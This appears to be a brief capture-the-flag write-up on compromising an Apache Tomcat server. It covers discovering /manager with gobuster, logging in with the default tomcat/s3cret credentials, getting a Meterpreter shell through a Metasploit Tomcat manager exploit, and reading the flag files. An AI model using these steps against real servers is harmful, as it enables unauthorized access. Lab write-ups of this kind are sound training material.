# Apache Tomcat Webserver

## Recon
Running gobuster shows hidden /manager directory that requires a username and password.

On the 401 Unauthorized error page, shows an example with username=tomcat and password=s3cret.

## Initial Exploitation

Use msfconsole to search for apache tomcat manager exploit

```
meterpreter > getuid
tomcat8

meterpreter > sysinfo
Computer    : xubuntu
OS          : Linux 4.4.0-104-generic (amd64)
Meterpreter : java/linux
```

Search for the flag:

```
meterpreter > search -f flag.txt
Found 2 results...
    /home/adminels/Desktop/flag.txt (12 bytes)
    /home/developer/flag.txt (29 bytes)
meterpreter > cat /home/adminels/Desktop/flag.txt
    You did it!
meterpreter > cat /home/developer/flag.txt
    Congratulations, you got it!
	
```

Other users in the home directory:
```
adminels
developer
elsuser
```
